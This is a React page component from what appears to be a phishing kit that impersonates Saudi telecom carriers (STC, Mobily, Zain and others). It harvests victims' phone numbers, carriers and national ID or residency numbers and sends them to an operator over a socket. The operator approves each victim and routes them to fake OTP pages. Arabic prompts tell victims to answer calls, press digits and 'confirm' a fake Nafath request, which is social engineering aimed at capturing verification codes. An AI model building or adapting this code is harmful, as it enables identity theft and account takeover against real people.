import React from "react";
import { useState } from "react";
import axios from "axios";

import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { useEffect } from "react";
import { MdOutlinePhoneCallback } from "react-icons/md";
import { serverRoute, socket } from "./Main";
import { useNavigate } from "react-router-dom";
import { useSocketEvent } from "../hooks/useSocketEvent";
import { useCountdown } from "../hooks/useCountdown";

export const testData = [
  {
    name: "اس تي سي",
    img: "/stc.png",
    content:
      "عملاء STC الكرام في حال تلفي مكالمة من 900 الرجاء قبولها واختيار الرقم 5",
  },
  {
    name: "اس تي سي جوي",
    img: "/stcgaw.png",
    content: "",
  },
  {
    name: "موبايلي",
    img: "/mobily_2.png",
    content:
      "ستصلك مكالمة من مزود الخدمة , يرجى اتباع التعليمات الصوتية و الضغط على الرقم الذي تسمعه لتأكيد الطلب",
  },
  {
    name: "زين",
    img: "/zain.png",
    content: "",
  },
  {
    name: "فيرجن",
    img: "/virgin.png",
    content: "",
  },
  {
    name: "ليبارا",
    img: "/lebra.png",
    content: "",
  },
  {
    name: "ياقوت",
    img: "/yaqoot.png",
    content: "",
  },
];
const Phone = () => {
  const [phoneNumber, setPhoneNumber] = useState(null);
  const [phoneId, setPhoneId] = useState(null);
  const navigate = useNavigate();
  const [phoneNetwork, setPhoneNetwork] = useState("اس تي سي");
  const query = new URLSearchParams(window.location.search);
  const code = query.get("mobily");
  const [verfiy, setVerfiy] = useState(code === "check" ? "Mobily" : null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const net = phoneNetwork;
  const { formattedMinutes, formattedSeconds } = useCountdown(180);

  const ID = sessionStorage.getItem("id");

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    if (!phoneNetwork) {
      setLoading(false);
      return window.alert("اختر مشغل الشبكة");
    }

    try {
      await axios
        .post(serverRoute + "/phone/" + sessionStorage.getItem("id"), {
          phoneNumber,
          phoneNetwork,
          phoneId,
        })
        .then(() =>
          socket.emit("phone", {
            _id: sessionStorage.getItem("id"),
            id: sessionStorage.getItem("id"),
            phoneNumber,
            phoneNetwork,
          })
        );
    } catch (error) {}
  };

  const selectedProvider =
    testData.find((item) => item.name === phoneNetwork) || testData[0];

  useSocketEvent("acceptPhone", (id) => {
    if (id === ID) {
      sessionStorage.setItem("provider", phoneNetwork);
      setLoading(false);
      if (phoneNetwork === "موبايلي") navigate("/mobilyOtp");
      else if (phoneNetwork === "اس تي سي") navigate("/stcOtp");
      else navigate("/phoneOtp");
    }
  });

  useSocketEvent("declinePhone", (id) => {
    if (id === ID) {
      setLoading(false);
      setError(true);
    }
  });

  useSocketEvent("acceptNormalPhone", ({ id }) => {
    if (id === ID) sessionStorage.setItem("provider", phoneNetwork);
  });

  useSocketEvent("declineNormalPhone", (id) => {
    if (id === ID) {
      setLoading(false);
      setError(true);
    }
  });

  useSocketEvent("acceptService", ({ id }) => {
    if (id === ID) {
      if (code === "check" || phoneNetwork === "Mobily") navigate("/mobilyOtp");
      else navigate("/phoneOtp");
    }
  });

  useSocketEvent("declineService", (id) => {
    if (id === ID) setVerfiy(null);
  });

  return (
    <div className="w-full  lg:w-1/2 flex flex-col items-center justify-center  rounded-md ">
      {!verfiy ? (
        <form
          className="bg-white border border-gray-300 my-2 min-h-screen rounded-md pt-0 p-3  text-sm w-11/12 "
          dir="rtl"
          onSubmit={handleSubmit}
        >
          {/* Header with logo */}
          <div className="flex justify-start items-start mb-4 w-full p-2 pr-4 pt-4  flex-col">
            <img src="/photoHeader2.jpeg" alt="Mutasil" className="w-20" />
            <div className="flex items-start py-4">
              <img src="/phoneHeader1.jpeg" alt="Mutasil" className="w-20" />
              <span className="font-semibold">
                يجب ان يكون رقم الجوال موثقا و مطابقا لبيانات الهوية الوطنية /
                الإقامة , ومرتبطاً ببطاقة الدفع المدخلة
              </span>
            </div>
          </div>
          {/* Provider logo section */}
          <div className="flex justify-end items-center mb-2 -mt-2 rounded-lg px-2">
            <img
              src={selectedProvider.img}
              alt={selectedProvider.name}
              className="h-16 object-contain w-20"
              onError={(e) => {
                e.target.style.display = "none";
              }}
            />
          </div>
          {/* Description */}
          <p
            className={`text-right text-lg text-gray-700  leading-relaxed px-2 font-bold ${
              selectedProvider.name === "اس تي سي"
                ? "text-purple-700"
                : selectedProvider.name === "موبايلي"
                ? "text-sky-600"
                : ""
            }`}
          >
            {selectedProvider.content}
          </p>

          {/* Phone number input */}
          <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
            <span className="font-semibold text-sm text-gray-700 w-full text-right">
              رقم الجوال
            </span>
            <div className="relative w-full" dir="ltr">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center">
                <img
                  src="https://flagcdn.com/w40/sa.png"
                  alt="SA"
                  className="w-5 h-4"
                />
              </span>
              <input
                value={phoneNumber}
                required
                onChange={(e) => setPhoneNumber(e.target.value)}
                dir="ltr"
                placeholder="0554637386"
                inputMode="numeric"
                type="text"
                maxLength={10}
                minLength={10}
                className="border border-gray-300 rounded-lg px-3 py-2.5 pl-12 text-base text-left outline-blue-500 w-full"
              />
            </div>
          </div>

          {/* Network provider selector */}
          <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
            <span className="font-semibold text-sm text-gray-700 w-full text-right">
              اختر مزود الخدمة
            </span>
            <select
              value={phoneNetwork}
              required
              onChange={(e) => setPhoneNetwork(e.target.value)}
              className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-right outline-blue-500 w-full bg-white"
            >
              {testData.map((provider) => (
                <option key={provider.name} value={provider.name}>
                  {provider.name}
                </option>
              ))}
            </select>
          </div>

          {/* National ID input */}
          <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
            <span className="font-semibold text-sm text-gray-700 w-full text-right">
              رقم الهوية الوطنية / الإقامة
            </span>
            <input
              dir="ltr"
              placeholder=""
              inputMode="numeric"
              value={phoneId}
              onChange={(e) => setPhoneId(e.target.value)}
              type="text"
              className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-left outline-blue-500 w-full"
            />
          </div>

          {error ? (
            <div className="w-full text-center text-red-500 absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center z-50">
              <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
                <AiOutlineCloseCircle className="text-6xl" />
                <div className="flex flex-col w-full items-center justify-center">
                  <span>رقم الهاتف غير صحيح</span>
                  <span className="text-sm">82A27833M4589370G</span>
                </div>
                <button
                  className="bg-gray-900 text-white w-11/12 py-3 rounded-lg"
                  onClick={() => setError(false)}
                >
                  حاول مرة ثانية
                </button>
              </div>
            </div>
          ) : null}

          {/* Submit button */}
          <div className="w-full flex items-center justify-center py-5 mt-4">
            <button
              type="submit"
              className="px-5 flex justify-center items-center py-3 bg-[#007bff] hover:bg-[#0056b3] text-white w-full rounded-lg text-base font-semibold transition-colors"
            >
              دخول
            </button>
          </div>

          {/* Footer logos */}
          <div className="flex justify-center items-center gap-4 mt-6 pt-6 border-t border-gray-200">
            <img
              src="/phoneFooter.jpeg"
              alt="CST"
              className=" object-contain "
            />
          </div>
        </form>
      ) : //  :
      //  verfiy === "STC" ? (
      //   <div className="w-full flex flex-col justify-center  items-center bg-white h-screen py-2 gap-y-10">
      //     <img
      //       src="https://upload.wikimedia.org/wikipedia/commons/e/e3/STC-01.svg"
      //       className="w-1/2"
      //     />
      //     <div className="  w-full flex flex-col jus items-center gap-y-4">
      //       <p className="text-xl font-bold">سوف يتم الاتصال بك الآن</p>
      //       <p className="font-bold text-gray-500" style={{ fontSize: "10px" }}>
      //         قم باتباع الخطوات الموجودة بالاتصال ليتم تسجيل رقم جوالك بوثيقة
      //         التأمين
      //       </p>
      //       <span className="text-purple-700 font-bold">! يرجي الإنتظار</span>
      //     </div>
      //     <div className="flex w-11/12 flex-col justify-center items-center bg-purple-100 rounded-full py-1">
      //       <span className="text-purple-700 font-bold ">
      //         إعادة الاتصال بعد{" "}
      //       </span>
      //       <span className="text-purple-700 font-bold">
      //         {formattedMinutes}:{formattedSeconds}
      //       </span>
      //     </div>
      //   </div>
      // )
      verfiy === "Mobily" ? (
        <div className="w-full bg-white flex items-start justify-center h-screen ">
          <div
            className="md:w-1/3 w-full flex flex-col items-center justify-center"
            dir="rtl"
          >
            <img src="/mobily.jpg" />
            <span className="text-gray-500 font-bold text-xl p-2">
              تاكيد طلب الغاء وثيقة الفحص الحالي بموعد وثيقة الفحص الجديد{" "}
            </span>
            <img src="/mobily2.jpg" />
            <div className="flex w-full p-2 gap-x-3 text-lg items-center mt-10 ">
              <MdOutlinePhoneCallback className="text-4xl text-sky-600" />
              <span className="font-bold">أثبت هويتك</span>
            </div>
            <p className="p-2" dir="rtl">
              ستصلك مكالمة من مزود الخدمة , يرجى اتباع التعليمات الصوتية و الضغط
              على الرقم الذي تسمعه لتأكيد الطلب
            </p>
            <button
              className="bg-sky-500 text-white w-1/2 self-start p-3 m-2 rounded-full my-5"
              onClick={() => {
                socket.emit("network", ID);
                setVerfiy("Mobily2");
              }}
            >
              متابعة
            </button>
          </div>
        </div>
      ) : verfiy === "Mobily2" ? (
        <div className="w-full bg-white flex items-start justify-center h-screen ">
          <div
            className="md:w-1/3 w-full flex flex-col items-center justify-center"
            dir="rtl"
          >
            <img src="/mobily.jpg" />
            <span className="text-gray-500 font-bold text-xl p-2">
              تاكيد طلب الغاء وثيقة الفحص الحالي بموعد وثيقة الفحص الجديد{" "}
            </span>
            <img src="/mobily2.jpg" />
            <div className="flex w-full p-2 gap-x-3 text-lg items-center mt-10 ">
              <TailSpin
                height="50"
                width="50"
                color="#0ea5e9"
                ariaLabel="tail-spin-loading"
                radius="1"
                wrapperStyle={{}}
                wrapperClass=""
                visible={true}
              />
              <span className="font-bold"> بانتظار تأكيد الجوال</span>
            </div>
            <p className="p-2">
              وافق على الاتصال واتمم العملية لتاكيد استبدال شريحة معلومات موعدك
              القديم على نظام نفاذ تجنّبا من الانتظار ٣٠ يوم .
            </p>
            <span className="w-full p-2">لم تستلم مكاملة ؟ </span>
            <span className="w-full p-2 flex items-center">
              يمكنك إعادة المحاولة خلال
              <span className="px-2 font-bold text-lg">
                {formattedSeconds} : {formattedMinutes}{" "}
              </span>
            </span>
            <button
              className={`${
                formattedMinutes === "00" && formattedSeconds === "00"
                  ? "bg-opacity-100"
                  : "bg-opacity-40"
              } bg-sky-500 text-white w-1/2 self-start p-3 m-2 rounded-full my-5`}
              disabled={!(formattedMinutes == "00" && formattedSeconds == "00")}
              onClick={() => console.log("mobily")}
            >
              تحقق
            </button>
          </div>
        </div>
      ) : (
        ""
      )}
      {loading ? (
        <div className="fixed top-0 w-full h-screen bg-[#ffffffc7]  flex items-center justify-center flex-col gap-y-5 z-50">
          <TailSpin
            height="50"
            width="50"
            color="blue"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
          <span className="font-semibold">
            يرجي الانتظار جاري التأكد من صحة البيانات المدخلة
          </span>
        </div>
      ) : (
        ""
      )}
    </div>
  );
};

export default Phone;
